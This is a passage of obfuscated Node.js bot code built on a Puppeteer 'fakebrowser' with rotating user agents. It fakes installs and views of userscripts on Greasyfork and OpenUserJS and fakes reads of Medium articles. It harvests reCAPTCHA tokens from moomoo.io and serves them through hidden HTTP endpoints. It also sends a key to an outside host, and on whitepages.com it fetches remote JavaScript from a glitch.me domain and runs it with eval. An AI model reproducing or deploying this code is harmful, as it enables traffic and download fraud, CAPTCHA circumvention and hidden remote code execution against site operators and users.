      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + a0(0xc) + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + Y(0xb) + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + Z(0x16, 'oPI*') + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + Y(0x10) + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + a0(0xa) + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0x1ae9 + 0x92 * 0x7 + 0x16eb
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xc72 + 0xc96 + -0x1908)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x18d3 + 0x436 * 0x2 + 0x1 * 0x10cb), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * -0x67d + -0x6c6 * 0x2 + 0x146d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x169 * 0x5 + 0x1f03 + -0x2610;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1eed + 0x26 * 0xb + -0x208f; w < getRandomInt(-0x22ea + -0x86a + -0x2b55 * -0x1, 0x19 * 0xa6 + 0xb99 * -0x1 + 0x8 * -0x93); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x110ee + -0x7025 * 0x1 + 0x1 * 0x4997);
        }
      }();
    }, -0x2145 + -0xd * -0x92 + -0x1 * -0x1a3f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x13a6 + -0xa51 * -0x3 + 0x3299 * -0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x9 * 0x1c + 0x1e85 + -0x1d89, -0x1bc4 + 0x2 * -0x191 + 0x14 * 0x18e)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xdc7d + 0x9476 + 0xbd37);
    }, -0xd54 + -0x1d99 + 0x2b51), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1f * -0x1d + -0x101a + 0x125 * 0xb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x107 * -0xd + 0x248d * 0x1 + -0xd * 0x2f0), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x9f * -0x39 + 0x10f1 + 0x1276), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x7 * 0x35c8d + -0x433f3 + 0x16612 * -0x4);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * -0x9a9 + -0x197a + 0x5 * 0x71b);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xd * 0x141 + -0x2242 + 0x3357);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1466 * -0x2 + 0x10f * 0x37 + -0x4375);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b,
    a2 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x5 * 0x8b + 0xc2c + 0x974 * -0x1) {
        const a1 = c;
        if (A['includes']('Firefox'))
          return A['slice'](A[a1(0x6)]('Firefox') + 'Firefox' ['length'] + (-0x1a05 * -0x1 + 0x9 * -0x1da + -0x95a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xcc2 + -0x1 * -0xb6 + -0x6 * -0x202, D['indexOf']('\x20'));
        return B ? E['slice'](-0x3 * 0xc1b + -0x131b + 0x376c, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3c81 + 0x36 * -0x143 + 0x2eb1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1465 * -0x2 + 0x481f + 0x49d9 * -0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + a2(0x9) + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a3(0x1a, 'bmoo') + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      a3(0x1d, '*9Up') + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
